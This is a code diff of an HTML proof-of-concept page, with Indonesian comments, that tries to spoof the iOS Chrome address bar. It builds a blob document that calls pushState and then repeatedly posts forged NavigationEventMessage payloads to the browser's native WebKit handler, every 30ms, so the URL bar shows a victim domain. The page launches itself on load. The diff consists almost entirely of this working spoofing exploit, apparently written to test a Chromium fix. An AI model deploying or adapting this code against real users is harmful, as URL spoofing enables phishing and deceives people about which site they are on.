@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Ultimate Hardened Bypass - iOS Chrome</title>
+    <title>PoC Ultimate Hardened & Forced Bypass - iOS Chrome</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -49,12 +49,12 @@
 <body>
 
     <h1>iOS Chrome Ultimate History Spoof PoC</h1>
-    <p>Halaman ini menguji validasi <code>IsHistoryStateChangeValid</code> tanpa ketergantungan port, dikombinasikan dengan manipulasi <code>pushState</code> lokal dan injeksi pesan natif secara agresif.</p>
+    <p>Menguji validasi origin pada <a href="https://chromium-review.googlesource.com/c/chromium/src/+/8291494" target="_blank">Change 8291494</a> dengan teknik *aggressive hammering* dan manipulasi state.</p>
 
     <div class="card">
-        <h3>1. Ultimate Blob Launcher</h3>
-        <p>Membuat objek blob mandiri dengan mekanisme pemicu ganda dan siklus pengiriman berkelanjutan.</p>
-        <button id="launch-btn">Luncurkan Ultimate PoC</button>
+        <h3>1. Ultimate Launcher</h3>
+        <p>Membuat objek blob mandiri dengan siklus pemicu pesan natif berkecepatan tinggi.</p>
+        <button id="launch-btn">Luncurkan PoC Sekarang</button>
         <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
@@ -66,7 +66,7 @@
 <script>
     const TARGET_VICTIM = "example.com";
 
-    // Template payload blob tingkat lanjut (tanpa port, full forced bypass)
+    // Template HTML payload blob dengan hammering agresif
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
 <title>Ultimate Hardened Target</title>
@@ -94,7 +94,7 @@
   document.getElementById('cur-url').textContent = location.href;
   bLog('Blob dokumen ultimate berhasil dimuat.');
 
-  // 1. Manipulasi DOM & pushState lokal (Same-Origin State)
+  // Manipulasi pushState lokal
   try {
     history.pushState({bypass: true}, '', '/trusted');
     document.getElementById('panel').style.display = 'block';
@@ -103,15 +103,14 @@
     bLog('pushState error: ' + e.message);
   }
 
-  // 2. Deteksi handler komunikasi natif iOS Chrome
   var mh = (window.webkit && window.webkit.messageHandlers) || {};
   if (!mh.NavigationEventMessage) {
-    bLog('SKIP: NavigationEventMessage handler tidak tersedia (bukan iOS Chrome).');
+    bLog('SKIP: NavigationEventMessage handler tidak tersedia.');
     return;
   }
   bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
 
-  // Pengambilan frame_id dengan multi-fallback yang kuat
+  // Pengambilan frame_id dengan multi-fallback
   var getFid = function() {
     try {
       if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
@@ -131,16 +130,13 @@
     return null;
   };
 
-  var fid = getFid();
-  bLog('Frame ID terdeteksi: ' + (fid || 'TIDAK DITEMUKAN'));
-
   var spoofUrl = 'blob:https://' + "${TARGET_VICTIM}" + '/';
   bLog('Target spoof URL: ' + spoofUrl);
 
-  // 3. Mekanisme Hammering Agresif Tanpa Henti (Forced Bypass Loop)
+  // Hammering agresif berkecepatan tinggi (tiap 30ms)
   var counter = 0;
   var aggressiveHammer = setInterval(function() {
-    var currentFid = getFid() || fid;
+    var currentFid = getFid();
     if (!currentFid) {
       bLog('[-] Menunggu sinkronisasi frame_id...');
       return;
@@ -156,24 +152,19 @@
         stateObject: '', baseUrl: 'https://x/',
         pageUrl: spoofUrl
       });
-      bLog('[Hammer #' + counter + '] Mengirimkan payload paksa dengan fid: ' + currentFid.slice(0,8));
+      bLog('[Hammer #' + counter + '] Mengirim payload dengan fid: ' + currentFid.slice(0,8));
     } catch(err) {
       bLog('[Hammer #' + counter + '] Error: ' + err.message);
     }
 
-    if (counter >= 50) {
+    if (counter >= 60) {
       clearInterval(aggressiveHammer);
       bLog('\\n--- EVALUASI AKHIR ---');
-      bLog('Periksa Address Bar Anda.');
-      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil / Rentan.');
-      bLog('Jika tetap menampilkan URL blob: Proteksi C++ aktif dan memblokir state change.');
+      bLog('Periksa bilah alamat (Address Bar) Anda.');
+      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil.');
+      bLog('Jika tetap menampilkan URL blob: Proteksi C++ aktif dan menolak state change.');
     }
-  }, 40); // Kirim setiap 40ms secara sangat cepat
-
-  // 4. Cadangan Redirect via pageshow
-  window.addEventListener('pageshow', () => {
-    bLog('Event pageshow tertangkap.');
-  });
+  }, 30);
 })();
 <\/script>`;
 
@@ -198,7 +189,6 @@
 
     document.getElementById('launch-btn').addEventListener('click', startUltimatePoC);
 
-    // Auto-trigger saat halaman dimuat
     window.onload = function() {
         setTimeout(startUltimatePoC, 400);
     };
